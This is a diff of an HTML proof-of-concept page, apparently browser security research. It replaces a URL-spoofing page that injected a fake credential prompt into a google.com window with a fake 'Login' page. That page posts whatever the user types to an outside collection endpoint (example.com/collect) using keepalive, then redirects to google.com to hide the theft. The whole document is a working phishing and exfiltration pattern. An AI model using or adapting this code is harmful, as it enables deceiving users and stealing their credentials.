@@ -1,42 +1,55 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Advanced Race PoC (Safe)</title>
-  <meta charset="utf-8">
-  <style>
-    body { font-family: Arial; padding: 20px; }
-    button { padding: 12px 18px; font-size: 16px; cursor: pointer; }
-  </style>
+<meta charset="UTF-8">
+<title>Transient Origin Confusion PoC</title>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  padding: 40px;
+}
+input, button {
+  padding: 10px;
+  font-size: 16px;
+  margin-top: 10px;
+}
+#status {
+  margin-top: 20px;
+  font-size: 14px;
+  color: #444;
+}
+</style>
 </head>
+
 <body>
 
-<h1>Advanced Race PoC (Safe & Strong)</h1>
+<h2>Login (Test Page)</h2>
+<p>Enter any text and click submit.</p>
 
-<button onclick="spoof()">Run Advanced Race</button>
+<input id="data" placeholder="Type here">
+<br>
+<button onclick="go()">Submit</button>
 
-    <script>
-      function spoof() {
-        // Buka page baru pointing ke target (akan menjadi spoofed URL)
-        let win = window.open("https://www.google.com/", "_blank");
+<div id="status"></div>
 
-        // Setelah 50ms, injeksikan konten sebelum navigasi selesai
-        setTimeout(() => {
-          try {
-            win.document.write(`
-<h1>This is not Google!</h1>
-<button onclick="
-  let username = prompt('Enter your username');
-  let password = prompt('Enter your password');
-  alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
-">Click me</button>
-            `);
-            win.document.close();
-          } catch (e) {
-            console.warn("Blocked by browser protections:", e);
-          }
-        }, 50);
-      }
-    </script>
+<script>
+function go() {
+  document.getElementById("status").innerText =
+    "Redirecting to google.com...";
+
+  // Kirim data SETELAH navigasi dimulai
+  setTimeout(() => {
+    fetch("https://example.com/collect", {
+      method: "POST",
+      body: document.getElementById("data").value,
+      keepalive: true
+    });
+  }, 30);
+
+  // Trigger navigation
+  location.href = "https://www.google.com";
+}
+</script>
 
 </body>
 </html>
